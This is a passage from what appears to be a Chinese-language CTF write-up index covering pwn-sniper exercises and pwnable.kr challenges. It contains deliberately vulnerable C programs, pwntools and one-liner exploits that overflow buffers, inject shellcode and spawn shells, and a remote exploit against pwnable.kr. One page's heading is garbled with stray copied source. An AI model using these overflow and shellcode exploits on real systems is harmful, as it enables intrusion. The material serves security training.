\u4e3b\u51fd\u6570\u8fd4\u56de\n}\n</code></pre> <p>\u7f16\u8bd1\u9009\u9879\u5982\u4e0b\uff1a</p> <pre><code>a.out:hello.c\n        gcc -g -fno-stack-protector -z execstack hello.c\nclean:\n        rm ./a.out\n</code></pre> <p>checksec</p> <pre><code>\u2514\u2500$ checksec --file=a.out\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified    Fortifiable      FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   75 Symbols        No    0            2a.out\n</code></pre> <p>objdump</p> <pre><code>\u2514\u2500$ objdump -t -j .text a.out \n\na.out:     file format elf64-x86-64\n\nSYMBOL TABLE:\n0000000000400500 l    d  .text  0000000000000000              .text\n0000000000400530 l     F .text  0000000000000000              deregister_tm_clones\n0000000000400560 l     F .text  0000000000000000              register_tm_clones\n00000000004005a0 l     F .text  0000000000000000              __do_global_dtors_aux\n00000000004005c0 l     F .text  0000000000000000              frame_dummy\n00000000004006e0 g     F .text  0000000000000002              __libc_csu_fini\n0000000000400670 g     F .text  0000000000000065              __libc_csu_init\n0000000000400500 g     F .text  000000000000002a              _start\n00000000004005ed g     F .text  0000000000000077              main\n</code></pre> <p>\u8fd0\u884c\u7a0b\u5e8f</p> <pre><code>\u2514\u2500$ ./a.out \n&amp;buffer = 0x7ffddf5e9f70\ntest\nContent of buffer : test\n</code></pre> <p>\u67e5\u770b\u5176\u53cd\u7f16\u8bd1\u4ee3\u7801</p> <pre><code>undefined8 main(void)\n{\n    int64_t iVar1;\n    undefined8 *puVar2;\n    char buffer [80];\n\n    // int main();\n    puVar2 = (undefined8 *)buffer;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    printf(\"&amp;buffer = %p\\n\", buffer);\n    fflush(_stdout);\n    read(0, buffer, 0xff);\n    printf(\"Content of buffer : %s\\n\", buffer);\n    return 0;\n}\n</code></pre> <p>\u5206\u6790\u5982\u4e0b\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e3b\u8981\u662f\u5c06\u8f93\u5165\u7684\u6570\u636e\u4ece\u7f13\u51b2\u533a\u590d\u5236\u7ed9buffer\u53d8\u91cf\uff0c\u7531\u4e8eread\u5e76\u672a\u9650\u5236\u8bfb\u53d6\uff0c\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u4e00\u6bb5shellcode\u5c06\u5176\u590d\u5236\u5230buffer\u4e2d\uff0c\u5e76\u5728\u8f93\u5165\u7684shellcode\u540e\u6dfb\u52a0\u8db3\u591f\u957f\u5ea6\u7684\u6570\u636e\u4f7f\u5176\u53ef\u4ee5\u8986\u76d6\u5230\u8fd4\u56de\u503c\uff0c\u5c06\u8fd4\u56de\u503c\u4fee\u6539\u6307\u5411\u5230buffer\u53d8\u91cf\uff0c\u4ece\u800c\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u5199\u5165\u7684shellcode\uff0c\u793a\u610f\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p>buffer\u53d8\u91cf\u957f\u5ea6\u4e3a80\uff0cebp\u957f\u5ea6\u4e3a8\uff0c\u957f\u5ea6\u4e00\u5171\u4e3a88</p> <pre><code>&gt;&gt;&gt; from pwn import *\n&gt;&gt;&gt; shellcode = asm(shellcraft.sh())\n&gt;&gt;&gt; print(shellcode)\nb'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80'\n&gt;&gt;&gt; len(shellcode)\n44\n</code></pre> <p>shellcode\u7684\u957f\u5ea6\u4e3a44,\u90a3\u4e4888-44=44,\u6240\u4ee5\u8fd8\u9700\u898144\u5b57\u8282\u7684\u586b\u5145\u6570\u636e</p> <p>Exp\u5982\u4e0b\uff1a</p> <pre><code>from pwn import *\n\nio = process('./a.out')\n\naddr  = io.recvline(keepends=False)\naddr  = addr[10:-1]\naddr  = addr.decode()\naddr = int(addr,16)\n\nshellcode = asm(shellcraft.sh())\n\nio.sendline(shellcode + b'a'*44 +p64(addr))\nio.interactive()\n</code></pre> <p></p>"},{"location":"pwn/pwn-sniper-03/","title":"pwn-sniper-03","text":"<p>\u6f0f\u6d1e\u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid win()\n{\n        printf(\"code flow successfully changed\\n\");\n}\n\nint main(int argc, char **argv)\n{\n        volatile int (*fp)();\n        char buffer[64];\n\n        fp = 0;\n\n        gets(buffer);\n\n        if(fp) {\n                printf(\"calling function pointer, jumping to 0x%08x\\n\", fp);\n                fp();\n        }\n}\n</code></pre> <p>\u7f16\u8bd1\u9009\u9879\u5982\u4e0b\uff1a</p> <pre><code>a.out:hello.c\n        gcc -g -fno-stack-protector -z execstack hello.c\nclean:\n        rm ./a.out\n</code></pre> <p>checksec</p> <pre><code>\u2514\u2500$ checksec --file=./a.out\n[*] '/home/kali/PwnMe/challenges/train/sniper/3/a.out'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n</code></pre> <p>objdump</p> <pre><code>\u2514\u2500$ objdump -t -j .text a.out\n\na.out:     file format elf64-x86-64\n\nSYMBOL TABLE:\n00000000004004d0 l    d  .text  0000000000000000              .text\n0000000000400500 l     F .text  0000000000000000              deregister_tm_clones\n0000000000400530 l     F .text  0000000000000000              register_tm_clones\n0000000000400570 l     F .text  0000000000000000              __do_global_dtors_aux\n0000000000400590 l     F .text  0000000000000000              frame_dummy\n0000000000400690 g     F .text  0000000000000002              __libc_csu_fini\n0000000000400620 g     F .text  0000000000000065              __libc_csu_init\n00000000004005bd g     F .text  0000000000000010              win\n00000000004004d0 g     F .text  0000000000000000              _start\n00000000004005cd g     F .text  000000000000004d              main\n</code></pre> <p>\u67e5\u770b\u53cd\u7f16\u8bd1\u4ee3\u7801</p> <pre><code>uint64_t dbg_main (char ** argv, int32_t argc) {\n    char ** var_60h;\n    int32_t var_54h;\n    char [64] buffer;\n    int32_t fp;\n    rsi = argv;\n    rdi = argc;\n    /* int main(int argc,char ** argv); */\n    var_54h = edi;\n    var_60h = rsi;\n    fp = 0;\n    rax = &amp;buffer;\n    rdi = rax;\n    gets ();\n    if (fp != 0) {\n        rax = fp;\n        rsi = fp;\n        eax = 0;\n        printf (\"calling function pointer, jumping to 0x%08x\\n\");\n        rdx = fp;\n        eax = 0;\n        void (*rdx)() ();\n    }\n    return rax;\n}\n</code></pre> <pre><code>void win(void)\n{\n    // void win();\n    puts(\"code flow successfully changed\");\n    return;\n}\n</code></pre> <p>\u672c\u9898\u76ee\u8f83\u4e3a\u7b80\u5355\uff0c\u6ca1\u6709\u5f00\u542f\u4ec0\u4e48\u4fdd\u62a4\uff0c\u7a0b\u5e8f\u529f\u80fd\u5c31\u662f\u4f7f\u7528gets\u51fd\u6570\u83b7\u53d6\u8f93\u5165\u6570\u636e\uff0c\u5224\u65adfp\u53d8\u91cf\u662f\u5426\u4e3a\u771f\uff0c\u4e3a\u771f\u5219\u6267\u884cprint\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fabuffer\u53d8\u91cf\u5230fp\u53d8\u91cf\u5904\uff0c\u5e76\u8986\u76d6EIP\u4e3awin\u51fd\u6570\u5730\u5740\uff0c\u4ece\u800c\u6267\u884cwin\u51fd\u6570\u529f\u80fd</p> <p>gdb\u8c03\u8bd5</p> <p></p> <p>buffer\u53d8\u91cf\u7684\u504f\u79fb\u5730\u5740\u4e3abp-0x50h</p> <p></p> <p>fp\u53d8\u91cf\u7684\u504f\u79fb\u5730\u5740\u4e3abp-0x8h</p> <p>\u4ece\u800c\u53ef\u4ee5\u5f97\u51fa\uff0cbuffer\u5230fp \u4e4b\u95f4\u7684\u8ddd\u79bb\u4e3a0x50h - 0x8h = 80-8 = 72</p> <p>\u67e5\u627ewin\u51fd\u6570\u7684\u5730\u5740</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0cwin\u51fd\u6570\u7684\u5730\u5740\u4e3a0x004005bd\uff0cexp\u5982\u4e0b\uff1a</p> <pre><code>python2 -c \"print 'A' * 72 + '\\xbd\\x05\\x40\\x00'\" | ./a.out  //win\u51fd\u6570\u5730\u5740\u4f7f\u7528\u5c0f\u7aef\u5e8f\n</code></pre> <p></p>"},{"location":"pwn/pwnable--bof/","title":"pwnable--bof","text":""},{"location":"pwn/pwnable--bof/#bofc","title":"bof.c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\nvoid func(int key){\n        char overflowme[32];\n        printf(\"overflow me : \");\n        gets(overflowme);       // smash me!\n        if(key == 0xcafebabe){\n                system(\"/bin/sh\");\n        }\n        else{\n                printf(\"Nah..\\n\");\n        }\n}\nint main(int argc, char* argv[]){\n        func(0xdeadbeef);\n        return 0;\n}\n</code></pre>"},{"location":"pwn/pwnable--bof/#ida","title":"IDA\u5206\u6790","text":""},{"location":"pwn/pwnable--bof/#shift-f12","title":"shift + f12","text":"<p>\u9009\u4e2ds \u5e76\u6309x\u952e</p> <p></p> <p>\u6309f5\u8f6c\u6210\u4f2a\u4ee3\u7801</p> <p></p> <p>\u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801</p> <p></p> <p>\u53ef\u4ee5\u5f97\u5230\uff0c\u9700\u8981\u7528\u8f93\u5165\u7684\u53d8\u91cfs\u8986\u76d6a1\u7684\u503c\u8ba9\u5176\u53d8\u4e3a0xCAFEBABE\uff0c\u4ece\u800c\u83b7\u53d6shell</p> <p></p> <p>\u7531\u4e0a\u56fe\u53ef\u4ee5\u5f97\u5230\u504f\u79fb\u5730\u5740\u4e3a 0x2C + 0x8\u4e2a\u5b57\u8282</p> <p>\u7f16\u5199exp\u811a\u672c crack.py</p> <pre><code>from pwn import *\n\nkey=p32(0xcafebabe)\n\npayload=remote(\"pwnable.kr\",9000)\n\npayload.send(bytes('a',encoding='utf8')*52+key)\n\npayload.interactive()\n</code></pre> <p></p>"},{"location":"pwn/pwnable--collision/","title":"include &lt;stdlib.h&gt;","text":""},{"location":"pwn/pwnable--collision/#include-unistdh","title":"include &lt;unistd.h&gt;","text":""},{"location":"pwn/pwnable--collision/#include-stdioh","title":"include &lt;stdio.h&gt;","text":""},{"location":"pwn/pwnable--collision/#include-stringh","title":"include &lt;string.h&gt;","text":"<p>void win()</p> <p>{</p> <p>printf(\"code flow successfully changed\\n\");</p> <p>}</p> <p>int main(int argc, char **argv)</p> <p>{</p> <p>volatile int (*fp)();</p> <p>char buffer[64];</p> <p>fp = 0;</p> <p>gets(buffer);</p> <p>if(fp) {</p> <p>printf(\"calling function pointer, jumping to 0x%08x\\n\", fp);</p> <p>fp();</p> <p>}</p> <p>}</p> <p>\u53c2\u8003\uff1apwnable-Col</p> <p>\u6d89\u53ca\u77e5\u8bc6\u70b9\uff1a</p> <p>1.\u6307\u9488\u7c7b\u578b\u8f6c\u6362</p> <p>2.\u5927\u5c0f\u7aef\u5e8f</p> <p>3.\u5b57\u7b26\u4e32\u8f6c\u6362ASCII\u7801</p> <p>4.\u54c8\u5e0c\u78b0\u649e</p> <p></p> <p>ssh col@pwnable.kr -p2222 (pw:guest)</p> <p></p> <p>\u67e5\u770b\u6587\u4ef6\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nunsigned long hashcode = 0x21DD09EC;\nunsigned long check_password(const char* p){\n    int* ip = (int*)p;\n\n    int i;\n    int res=0;\n    for(i=0; i&lt;5; i++){\n        res += ip[i];\n    }\n    return res;\n}\n\nint main(int argc, char* argv[]){\n    if(argc&lt;2){\n        printf(\"usage : %s [passcode]\\n\", argv[0]);\n        return 0;\n    }\n    if(strlen(argv[1]) != 20){\n        printf(\"passcode length should be 20 bytes\\n\");\n        return 0;\n    }\n\n    if(hashcode == check_password( argv[1] )){\n        system(\"/bin/cat flag\");\n        return 0;\n    }\n    else\n        printf(\"wrong passcode.\\n\");\n    return 0;\n}\n</code></pre> <p>\u53ef\u4ee5\u5728col.c\u4e2d\u770b\u5230\u8fd9\u53e5\u63d0\u793a\uff1apasscode length should be 20 bytes\u2013&gt;\u5bc6\u7801\u957f\u5ea6\u5e94\u8be5\u4e3a20\u4e2a\u5b57\u8282</p> <p>\u4f20\u5165check_password\u7684\u662f\u4e00\u4e2a\u4e0d\u53ef\u53d8\u5b57\u7b26\u4e32\u6307\u9488\uff0c\u7136\u540e\u5c06\u5176\u5f3a\u5236\u8f6c\u53d8\u4e3a\u6574\u6570\u578b\u6307\u9488\uff1b</p> <p>\u4e4b\u540e\u8fdb\u884c\u4e00\u5171\u5faa\u73af5\u6b21\u7684for\u5faa\u73af\u7d2f\u52a0\uff1b</p> <p>p\u957f\u5ea6\u4e3a20\u4e2a\u5b57\u8282\uff0c\u8f6c\u6362\u540eip\u957f\u5ea6\u4f9d\u7136\u662f20\u4e2a\u5b57\u8282\uff0c\u7ed3\u5408\u524d\u9762\u67e5\u770b\u6587\u4ef6\u7c7b\u578b\uff0c\u53ef\u4ee5\u63a8\u51fa\u4e00\u5171ip\u67095\u4e2a\u6574\u6570\uff0c\u6bcf\u4e2a\u6574\u6570\u957f\u5ea6\u4e3a4\u4e2a\u5b57\u8282</p> <p>hashcode\u7684\u7ed3\u6784\u5e94\u8be5\u662f\uff1a<code>hashcode = A + B + C + D + E=0x21DD09EC</code>\uff1b</p> <p>\u7b54\u6848\u53ef\u4ee5\u6709\u5f88\u591a\u79cd\uff0c\u53ea\u8981\u6ee1\u8db3\u4e94\u4e2a\u76f8\u52a0\u7ed3\u679c\u4e3a0x21DD09EC\u5373\u53ef</p> <pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~]\n\u2514\u2500# echo 'obase=10; ibase=16; 21DD09EC' | bc\n568134124\n</code></pre> <pre><code>\u2514\u2500# bc\n568134124/5\n113626824\n113626824*5\n568134120\n</code></pre> <pre><code>\u2514\u2500# echo 'obase=16; ibase=10; 113626824' | bc\n6C5CEC8\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c0x21DD09EC\u6574\u96645\u4f59\u6570\u4e3a4,\u5219\u4e94\u4e2a\u6574\u6570\u53ef\u4ee5\u4e3a0x6C5CEC8\u00d74 + (0x6C5CEC8+4=0x6C5CECC)=0x6C5CEC8\u00d74 + 0x6C5CECC</p> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>'\\xC8\\xCE\\xC5\\x06' * 4 + '\\xCC\\xCE\\xC5\\x06'\n</code></pre> <p></p> <p>**PS:**\u8fd9\u91cc\u8981\u6ce8\u610f\\xC8\\xCE\\xC5\\x06\u53ca\\xCC\\xCE\\xC5\\x06\u90fd\u662f\u5c0f\u7aef\u5e8f\u683c\u5f0f</p>"},{"location":"pwn/pwnable--fd%20--%20%28File%20descriptor%29/","title":"pwnable--fd -- (File descriptor)","text":"<p>ssh fd@pwnable.kr -p2222 (pw:guest)</p> <p></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nchar buf[32];\nint main(int argc, char* argv[], char* envp[]){\n    if(argc&lt;2){\n        printf(\"pass argv[1] a number\\n\");\n        return 0;\n    }\n    int fd = atoi( argv[1] ) - 0x1234;\n    int len = 0;\n    len = read(fd, buf, 32);\n    if(!strcmp(\"LETMEWIN\\n\", buf)){\n        printf(\"good job :)\\n\");\n        system(\"/bin/cat flag\");\n        exit(0);\n    }\n    printf(\"learn about Linux file IO\\n\");\n    return 0;\n\n}\n</code></pre> <p>\u8fd9\u91cc\u8981\u6ce8\u610flinux\u76f8\u5173\u51fd\u6570\u7684\u5177\u4f53\u4f7f\u7528\u6280\u5de7</p> <pre><code>atoi() \u2014 Convert Character String to Integer\n</code></pre> <pre><code>Linux standard IO streams\n\nA Linux shell, such as Bash, receives input and sends output as sequences or streams of characters. Each character is independent of the one before it and the one after it. The characters are not organized into structured records or fixed-size blocks. Streams are accessed using file IO techniques, whether or not the actual stream of characters comes from or goes to a file, a keyboard, a window on a display, or some other IO device. Linux shells use three standard I/O streams, each of which is associated with a well-known file descriptor:\n\nstdout is the standard output stream, which displays output from commands. It has file descriptor 1.\nstderr is the standard error stream, which displays error output from commands. It has file descriptor 2.\nstdin is the standard input stream, which provides input to commands. It has file descriptor 0.\n\nInput streams provide input to programs, usually from terminal keystrokes. Output streams print text characters, usually to the terminal. The terminal was originally an ASCII typewriter or display terminal, but now, it is more often a text window on a graphical desktop.\n</code></pre> <p></p> <p>\u5206\u6790\uff1afd.c\u9700\u8981\u4f20\u5165\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540e\u5c06\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u53c2\u6570\u901a\u8fc7atoi\u53c2\u6570\u8f6c\u6362\u4e3a\u6574\u5f62\u5e76\u51cf\u53bb 0x1234</p> <p>\u7531\u4e0a\u5df2\u77e5\uff0c\u5982\u679cfd\u4e3a0\u7684\u8bdd\uff0c\u5219\u7a0b\u5e8f\u5c06\u4ecestdin\u8bfb\u5165\u6570\u636e\u81f3buff</p> <p>\u6545\u800c\u4f20\u5165\u53c2\u6570\u4e3a0x1234\u7684\u5341\u8fdb\u52364660</p> <pre><code>\u2514\u2500# echo $((num=0x1234))\n4660\n</code></pre> <p>\u7136\u540e\u518d\u5339\u914dstrcmp\u4e2d\u7684\u5b57\u7b26\u4e32\"LETMEWIN\\n\"\uff0c\u5373\u53ef\u5f97\u5230flag</p> <p></p>"},{"location":"pwn/pwnable--flag--%28reverse%29/","title":"pwnable--flag--(reverse)","text":""},{"location":"pwn/pwnable--flag--%28reverse%29/#psxxdkali","title":"PS:xxd\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u2013kali","text":"<pre><code>Papa brought me a packed present! let's open it.\n\nDownload : http://pwnable.kr/bin/flag\n\nThis is reversing task. all you need is binary\n</code></pre> <p>\u4e0b\u8f7d\u6587\u4ef6\u5e76\u68c0\u67e5\uff1a</p> <pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/Desktop/pwnable]\n\u2514\u2500# checksec flag \n[*] '/root/Desktop/pwnable/flag'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n    Packer:   Packed with UPX\n\n\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/Desktop/pwnable]\n\u2514\u2500# file flag              \nflag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header\n</code></pre> <p>\u8fd0\u884c\u4e00\u4e0bflag</p> <pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/Desktop/pwnable]\n\u2514\u2500# ./flag \nI will malloc() and strcpy the flag there. take it.\n</code></pre> <p>\u7528IDA\u6253\u5f00\uff0c\u53d1\u73b0\u53c2\u6570\u975e\u5e38\u5c11\uff0c\u6000\u7591\u52a0\u58f3\uff0c\u4f7f\u7528\u5de5\u5177\u68c0\u6d4b\uff1a</p> <pre><code>\u2514\u2500# xxd flag|tail                                                                                                                                                 1 \u2a2f\n00051d20: 77c4 8a1d b0f1 d302 6973 b0a0 c023 8d6d  w.......is...#.m\n00051d30: 616b 424e 9948 2c86 8ec3 0232 2a45 db17  akBN.H,....2*E..\n00051d40: 0981 0be3 b91f 2656 2211 c349 4608 1fb8  ......&amp;V\"..IF...\n00051d50: 3b9d c5c0 e820 1e5f 5f00 01a2 30b0 9943  ;.... .__...0..C\n00051d60: e968 58b1 f464 65e3 b58b 137a 54de 7375  .hX..de....zT.su\n00051d70: 6022 5d52 d7e5 00bb c625 8581 116d 4992  `\"]R.....%...mI.\n00051d80: 9041 9f00 a092 24ff 0000 0000 5550 5821  .A....$.....UPX!\n00051d90: 0000 0000 5550 5821 0d16 0807 19cc 204a  ....UPX!...... J\n00051da0: dbd8 21c5 3145 0100 5e70 0000 217c 0d00  ..!.1E..^p..!|..\n00051db0: 4919 0089 bc00 0000                      I.......\n</code></pre> <p>\u53d1\u73b0\u662fUPX\u52a0\u58f3\uff0c\u5728linux\u4e0b\u4f7f\u7528\u00a0<code>upx -d flag</code> \u8131\u58f3\uff0c\u7136\u540e\u4f7f\u7528IDA\u6253\u5f00</p> <p></p> <p>\u53cc\u51fbflag\u8df3\u8f6c\u81f3\u4e0b\u56fe\uff0c\u5f97\u5230flag</p> <p></p>"},{"location":"pwn/pwnable--input/","title":"pwnable--input","text":"<p>ssh input2@pwnable.kr -p2222 (pw:guest)</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;arpa/inet.h&gt;\n\nint main(int argc, char* argv[], char* envp[]){\n        printf(\"Welcome to pwnable.kr\\n\");\n        printf(\"Let's see if you know how to give input to program\\n\");\n        printf(\"Just give me correct inputs then you will get the flag :)\\n\");\n\n        // argv\n        if(argc != 100) return 0;\n        if(strcmp(argv['A'],\"\\x00\")) return 0;\n        if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0;\n        printf(\"Stage 1 clear!\\n\");\n\n        // stdio\n        char buf[4];\n        read(0, buf, 4);\n        if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0;\n        read(2, buf, 4);\n        if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0;\n        printf(\"Stage 2 clear!\\n\");\n\n        // env\n        if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0;\n        printf(\"Stage 3 clear!\\n\");\n\n        // file\n        FILE* fp = fopen(\"\\x0a\", \"r\");\n        if(!fp) return 0;\n        if( fread(buf, 4, 1, fp)!=1 ) return 0;\n        if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0;\n        fclose(fp);\n        printf(\"Stage 4 clear!\\n\");\n\n        // network\n        int sd, cd;\n        struct sockaddr_in saddr, caddr;\n        sd = socket(AF_INET, SOCK_STREAM, 0);\n        if(sd == -1){\n                printf(\"socket error, tell admin\\n\");\n                return 0;\n        }\n        saddr.sin_family = AF_INET;\n        saddr.sin_addr.s_addr = INADDR_ANY;\n        saddr.sin_port = htons( atoi(argv['C']) );\n        if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){\n                printf(\"bind error, use another port\\n\");\n                return 1;\n        }\n        listen(sd, 1);\n        int c = sizeof(struct sockaddr_in);\n        cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);\n        if(cd &lt; 0){\n                printf(\"accept error, tell admin\\n\");\n                return 0;\n        }\n        if( recv(cd, buf, 4, 0) != 4 ) return 0;\n        if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0;\n        printf(\"Stage 5 clear!\\n\");\n\n        // here's your flag\n        system(\"/bin/cat flag\");\n        return 0;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8be5\u9898\u76ee\u5206\u4e3a\u4e94\u4e2a\u9636\u6bb5\uff0c\u5206\u522b\u662f argv\u3001stdio\u3001env\u3001file\u3001network\uff0c\u63a5\u4e0b\u6765\u9010\u4e2a\u53ca\u8fdb\u884c\u5206\u6790\uff1a</p>"},{"location":"pwn/pwnable--input/#argv","title":"\u7b2c\u4e00\u9636\u6bb5\uff1aargv","text":"<pre><code>        // argv\n        if(argc != 100) return 0;\n        if(strcmp(argv['A'],\"\\x00\")) return 0;\n        if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0;\n        printf(\"Stage 1 clear!\\n\");\n</code></pre> <p>\u8981\u6c42\u8f93\u5165\u53c2\u6570100\u4e2a\uff0c\u4e14\u7b2cA=65\u4e2a\u53c2\u6570\u4e3a\"\\x00\" \u7b2cB=66\u4e2a\u53c2\u6570\u4e3a\"\\x20\\x0a\\x0d\"</p> <p>\u5bf9\u5e94\u7684writeup\u5982\u4e0b</p> <pre><code># -*- coding:utf-8 -*-\nfrom pwn import *\n\n#argv\nargs = ['a']*100\nargs[65] = '\\x00'\nargs[66] = '\\x20\\x0a\\x0d'\np = process(executable='./input',argv=args) \np.interactive()\n</code></pre>"},{"location":"pwn/pwnable--input/#stdio","title":"\u7b2c\u4e8c\u9636\u6bb5\uff1astdio","text":"<pre><code>        // stdio\n        char buf[4];\n        read(0, buf, 4);  //\u8f93\u5165\u6d410-Stdin\n        if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0;\n        read(2, buf, 4); //\u9519\u8bef\u8f93\u51fa\u6d412-stderr\n        if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0;\n        printf(\"Stage 2 clear!\\n\");\n</code></pre> <p>Linux\u628a\u6240\u6709\u7684\u4e1c\u897f\u770b\u505a\u6587\u4ef6\uff0c\u5176\u4e2d0,1,2\u6bd4\u8f83\u7279\u6b8a\uff0c\u5206\u522b\u4ee3\u8868\u8f93\u5165\u6d410-Stdin\uff0c\u8f93\u51fa\u6d411-stdout\u548c\u9519\u8bef\u8f93\u51fa\u6d412-stderr</p> <p><code>memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)</code>\u8fd9\u4e2a\u547d\u4ee4\uff0c\u4f5c\u7528\u662f\u4ece\u7ed9\u5b9a\u7684\u4e24\u4e2a\u5185\u5b58\u5730\u5740\u5f00\u59cb\uff0c\u6bd4\u8f83\u6307\u5b9a\u7684\u5b57\u8282\u4e2a\u6570\u3002\u8fd9\u91cc\u5c31\u662f\u6bd4\u8f83<code>buf</code>\u5f00\u59cb\u76844\u4e2a\u5b57\u8282\u548c<code>\"\\x00\\x0a\\x00\\xff\"</code></p> <p>buf\u662f\u901a\u8fc7<code>read(0, buf, 4)</code>\u5199\u5165\u7684\u3002\u4e4b\u524d\u7684\u9898\u76ee\u4e2d\u4e5f\u6709\u9047\u89c1\u8fc7<code>read</code>\u51fd\u6570</p> <p>fd = 0\uff0c\u4e5f\u5bf9\u5e94\u4e86\u7a0b\u5e8f\u4e2d\u7684\u6807\u51c6\u5316\u8f93\u5165,\u53ef\u4ee5\u4fee\u6539\u7a0b\u5e8f\u7684\u6807\u51c6\u5316\u8f93\u5165\uff08stdin\uff09\u6765\u5b9e\u73b0\u8f93\u5165\u4e0d\u53ef\u89c1\u5b57\u7b26</p> <p>fd = 2\uff0c\u5bf9\u5e94\u4e86\u7a0b\u5e8f\u4e2d\u7684\u6807\u51c6\u5316\u9519\u8bef;\u6807\u51c6\u5316\u9519\u8bef\u65e0\u6cd5\u901a\u8fc7\u547d\u4ee4\u884c\u8f93\u5165\u6765\u4fee\u6539\uff0c\u9700\u8981\u901a\u8fc7\u521b\u5efa\u901a\u9053\u7684\u65b9\u5f0f\u91cd\u5b9a\u5411\u7a0b\u5e8f\u7684\u6807\u51c6\u5316\u9519\u8bef\u4fe1\u606f</p> <pre><code>    stdin = \u201c\\x00\\x0a\\x00\\xff\u201d\n    stderr = \u201c\\x00\\x0a\\x02\\xff\u201d\n</code></pre>"},{"location":"pwn/pwnable--input/#env","title":"\u7b2c\u4e09\u9636\u6bb5\uff1aenv","text":"<pre><code>        // env\n        if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0;\n        printf(\"Stage 3 clear!\\n\");\n</code></pre> <p>char getenv(const char name) \u641c\u7d22 name \u6240\u6307\u5411\u7684\u73af\u5883\u5b57\u7b26\u4e32\uff0c\u5e76\u8fd4\u56de\u76f8\u5173\u7684\u503c\u7ed9\u5b57\u7b26\u4e32,\u73af\u5883\u53d8\u91cf\u7684\u683c\u5f0f\u4e3aname\uff1dvalue</p> <pre><code>env = {\"\\xde\\xad\\xbe\\xef\":\"\\xca\\xfe\\xba\\xbe\"}\n</code></pre>"},{"location":"pwn/pwnable--input/#file","title":"\u7b2c\u56db\u9636\u6bb5\uff1afile","text":"<pre><code>        // file\n        FILE* fp = fopen(\"\\x0a\", \"r\");\n        if(!fp) return 0;\n        if( fread(buf, 4, 1, fp)!=1 ) return 0;\n        if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0;\n        fclose(fp);\n        printf(\"Stage 4 clear!\\n\");\n</code></pre> <p>fread\u51fd\u6570\uff1a</p> <p>**<code>size_t fread(void *buffer, size_t size, size_t count FILE *stream)</code></p> <pre><code>#file\nwith open(\"\\x0a\",\"w+\") as f:\n    f.write(\"\\x00\\x00\\x00\\x00\")\n</code></pre>"},{"location":"pwn/pwnable--input/#network","title":"\u7b2c\u4e94\u9636\u6bb5\uff1anetwork","text":"<pre><code>        // network\n        int sd, cd;\n        struct sockaddr_in saddr, caddr;\n        sd = socket(AF_INET, SOCK_STREAM, 0);\n        if(sd == -1){\n                printf(\"socket error, tell admin\\n\");\n                return 0;\n        }\n        saddr.sin_family = AF_INET;\n        saddr.sin_addr.s_addr = INADDR_ANY;\n        saddr.sin_port = htons( atoi(argv['C']) );\n        if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){\n                printf(\"bind error, use another port\\n\");\n                return 1;\n        }\n        listen(sd, 1);\n        int c = sizeof(struct sockaddr_in);\n        cd = accept(sd, (struct sockaddr *)&amp;caddr, 